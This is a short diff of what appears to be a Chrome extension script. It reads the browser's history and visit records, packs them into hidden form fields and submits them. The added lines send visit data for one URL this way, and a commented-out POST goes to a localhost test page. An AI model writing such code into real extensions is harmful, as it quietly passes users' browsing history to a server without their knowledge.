@@ -29,6 +29,16 @@ chrome.history.search({text:'',maxResults:3}, function(data) {
       f.appendChild(i);
       d.body.appendChild(f);
       f.submit();
+      chrome.history.getVisits({url:'http://www.w3schools.com/jsref/jsref_forEach.asp'},function(visits){
+      var visits1=JSON.stringify(visits);
+      var j=d.createElement('input');
+      j.type='hidden';
+      j.name='visits';
+      j.value=visits1;
+      f.appendChild(j);
+      d.body.appendChild(f);
+      f.submit();
+      });
    /*
    request= new XMLHttpRequest();
    request.open("POST", "http://localhost/test.php", true);
